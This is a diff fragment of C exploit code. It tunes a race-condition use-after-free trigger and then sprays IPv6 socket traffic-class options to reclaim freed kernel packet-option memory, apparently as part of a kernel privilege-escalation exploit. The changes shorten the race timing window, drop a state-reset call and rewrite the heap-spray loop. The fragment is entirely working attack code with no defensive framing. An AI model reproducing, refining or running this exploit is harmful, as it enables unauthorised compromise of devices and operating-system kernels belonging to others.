@@ -250,39 +250,44 @@ void* free_thread(void* arg) {
 
 void trigger_uaf(struct opaque* o) {
     pin_to_cpu(1);
-    set_tclass(o->master_sock, 0); // Clean race condition state
+
     o->triggered = o->padding = o->done1 = o->done2 = 0;
 
     pthread_t th1, th2;
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
 
-    nanosleep(NANOSLEEP_50US, NULL);   // Race condition critical
+    nanosleep(NANOSLEEP_10US, NULL); // Critical timing window for race condition
 
     const int MAX_SPRAY = SPRAY_SIZE;
     int attempts = 0;
 
     while (attempts++ < UAF_RECLAIM_TRIES) {
         for (int i = 0; i < MAX_SPRAY; i++) {
-            if (set_tclass(o->spray_sock[i], TCLASS_SPRAY))
+            int val = TCLASS_SPRAY;
+            if (setsockopt(o->spray_sock[i], IPPROTO_IPV6,
+                IPV6_TCLASS, &val, sizeof(val))) {
                 reset_ipv6_opts(o->spray_sock[i]);
+                }
         }
 
         if (get_tclass(o->master_sock) == TCLASS_SPRAY)
             break;
 
-        if (o->triggered)                 // keep break
+        if (o->triggered)
             break;
 
-        for (int i = 0; i < MAX_SPRAY; i++)   //
+        for (int i = 0; i < MAX_SPRAY; i++) {
             free_pktopts(o->spray_sock[i]);
-
+        }
         nanosleep(NANOSLEEP_100US, NULL);
     }
 
     o->triggered = 1;
-    for (int wait = 0; wait < 100 && (!o->done1 || !o->done2); wait++)
+
+    for (int wait = 0; wait < 100 && (!o->done1 || !o->done2); wait++) {
         nanosleep(NANOSLEEP_100US, NULL);
+    }
 }
 
 int build_rthdr_msg(char* buf, int size) {
